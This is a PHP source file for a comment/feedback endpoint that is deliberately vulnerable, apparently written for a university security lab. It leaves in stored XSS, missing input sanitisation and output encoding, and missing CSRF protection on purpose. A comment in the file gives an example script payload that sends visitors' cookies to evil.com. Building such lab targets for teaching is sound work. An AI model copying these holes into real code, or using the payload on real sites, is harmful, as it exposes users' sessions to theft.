<?php
// =============================================================================
// VULNERABLE COMMENT/FEEDBACK ENDPOINT - CIS 3353 Security Lab
// =============================================================================
// Vulnerabilities:
//   1. Stored XSS via comment content
//   2. No input sanitization or output encoding
//   3. No CSRF protection
// =============================================================================

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$comments_file = '/var/www/data/comments.json';

if (!file_exists($comments_file)) {
    file_put_contents($comments_file, json_encode([]));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $name = $input['name'] ?? 'Anonymous';
    $comment = $input['comment'] ?? '';

    error_log("COMMENT POST: name=$name from=" . $_SERVER['REMOTE_ADDR']);

    // VULNERABILITY: No sanitization - stored XSS possible
    // Attacker can submit: <script>document.location='http://evil.com/?c='+document.cookie</script>
    $comments = json_decode(file_get_contents($comments_file), true);
    $comments[] = [
        'id' => count($comments) + 1,
        'name' => $name,          // No sanitization
        'comment' => $comment,    // No sanitization - XSS vector
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR']
    ];

    file_put_contents($comments_file, json_encode($comments, JSON_PRETTY_PRINT));

    echo json_encode(['success' => true, 'message' => 'Comment posted']);
} else {
    $comments = json_decode(file_get_contents($comments_file), true);
    // VULNERABILITY: Comments rendered with raw HTML (XSS)
    $html = '<div class="comments">';
    foreach ($comments as $c) {
        $html .= "<div class='comment'><b>{$c['name']}</b>: {$c['comment']}</div>";
    }
    $html .= '</div>';

    echo json_encode([
        'success' => true,
        'count' => count($comments),
        'comments' => $comments,
        'html_render' => $html  // Rendered HTML with unsanitized user input
    ]);
}
?>
